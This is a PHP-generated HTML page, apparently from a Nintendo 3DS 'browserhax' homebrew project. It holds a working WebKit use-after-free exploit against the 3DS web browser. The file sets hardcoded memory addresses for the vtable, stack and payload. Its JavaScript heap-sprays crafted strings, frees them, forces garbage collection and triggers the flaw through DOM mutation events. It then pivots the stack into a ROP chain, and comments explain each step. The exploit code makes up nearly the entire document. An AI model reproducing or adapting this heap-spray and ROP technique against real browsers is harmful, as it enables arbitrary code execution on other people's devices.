<?php

//https://trac.webkit.org/changeset/106972

include_once("/home/yellows8/browserhax/browserhax_cfg.php");

include_once("3dsbrowserhax_common.php");

if(($browserver & 0x80) == 0)
{
	if(($browserver & 0xf) <= 0x7)
	{
		$VTABLEPTR = 0x0964f018;
		$STACKPTR_ADR = 0x09670024;
		$OBJDATAPAYLOAD_ADDR = 0x091cb000;
	}
	else
	{
		echo "This browser version is not supported.\n";
		exit;
	}
}
else
{
	echo "This browser is not supported.\n";
	exit;
}

$ROPHEAP = $VTABLEPTR;

$OBJECTDATA_OVERWRITE = "\"";

for($i=0; $i<0x40; $i+=4)
{
	if($i!=0x4)
	{
		$OBJECTDATA_OVERWRITE.= genu32_unicode($ROP_LDRR0R4_LDRR0_R0OFF4_LDRR0_R0OFF34_OBJVTABLECALL_5C_POPR4LR);//Vtable funcptr referred to in the crash() comments, for the use-after-free. Once executed, this will load r0 from *r4(freelist nextptr @ _this+0). Then this will set r0 to $OBJDATAPAYLOAD_ADDR via the data @ +4(word written below), and then set r0/_this to *(r0+0x34)(which is also $OBJDATAPAYLOAD_ADDR). Then vtable funcptr +0x5c is called with _this, see below(some data is popped from stack too but this doesn't matter here).
	}
	else
	{
		$OBJECTDATA_OVERWRITE.= genu32_unicode($OBJDATAPAYLOAD_ADDR);
	}
}

$OBJECTDATA_OVERWRITE .= "\"";

$OBJDATAPAYLOAD = "\"";
for($j=0; $j<0x8000; $j+=0x40)
{
	for($i=0; $i<0x40; $i+=4)
	{
		if($i==0x34)
		{
			$OBJDATAPAYLOAD.= genu32_unicode($OBJDATAPAYLOAD_ADDR+4);//Addr of the object used when doing the vtable funcptr call with vtable +0x5c.
		}
		else if($i<0x34 && $i!=0x0)
		{
			$OBJDATAPAYLOAD.= genu32_unicode($VTABLEPTR);
		}
		else if($i==0x38)//Object +0x34 with the above used with stack-pivot(sp).
		{
			$OBJDATAPAYLOAD.= genu32_unicode($STACKPTR_ADR);
		}
		else
		{
			$OBJDATAPAYLOAD.= genu32_unicode($POPPC);
		}
	}
}
$OBJDATAPAYLOAD .= "\"";

generate_ropchain();

?>
<!DOCTYPE html>
<html>
<body><div><script>
//https://trac.webkit.org/changeset/106972

obj = new Array();
objdatapayload = new Array();

function spray()
{
	for(i=0; i<1200; i++)
	{
		obj[i] = unescape(<?= $OBJECTDATA_OVERWRITE ?>);
	}
}

function spray_free()
{
	for(i=0; i<1200; i++)
	{
		obj[i] = null;
	}
}

function setup_objdatapayload()
{
	for(i=0; i<300; i++)
	{
		objdatapayload[i] = unescape(<?= $OBJDATAPAYLOAD ?>);
	}
}

function ropsetup()//This function was originally based on heap() from: http://www.exploit-db.com/exploits/16974/
{
	var stackpivot = unescape(<?= $STACKPIVOT ?>);
	var ropchainstart = unescape(<?= $NOPSLEDROP ?>);
	var ropchain = unescape(<?= $ROPCHAIN ?>);

	do
	{
		stackpivot += stackpivot;
		ropchainstart += ropchainstart;
	} while (stackpivot.length<0x10000);

	ropchainstart += ropchain;

        target = new Array();
	target2 = new Array();
        for(i = 0; i < 10; i++){
            if (i<5) {
		target[i] = stackpivot;
		target2[i] = target[i].substring(0);
		} else if (i>5) {
			target[i] = ropchainstart;
			target2[i] = target[i].substring(0);
		}
        }
}

function gc()
{
    if (window.GCController)
        return GCController.collect();

    for (var i = 0; i < 10000; i++) { // > force garbage collection (FF requires about 9K allocations before a collect)
        var s = new String("abc");
    }
}

    function crash() {
        document.open();
        document.write("WebKit didn't crash, this title doesn't seem to be affected these vuln(s).");
        document.close();

        //gc();//Seems like this isn't actually needed anymore.
        spray();
        setup_objdatapayload();
        ropsetup();
        spray_free();
        gc();//Force the allocated memory which was just sprayed to be garbage-collected.
        //After this returns, an object vtable funcptr call will be done, where the vtable was overwritten with a freelist nextptr, due to the object being freed. The memory at this nextptr is the 0x40-byte chunks sprayed in spray(), with the first word there being overwritten with another nextptr due to this memory being freed too. Hence, the loaded funcptr is from object_nextptr+0x28.
    }

    setTimeout(function () {
        document.addEventListener('DOMNodeInsertedIntoDocument', function () { crash(); }, true);
        document.addEventListener('DOMSubtreeModified', function () { /* noop */ }, false);
        document.body = document.createElement('body');
    }, 0);

</script></body></html>
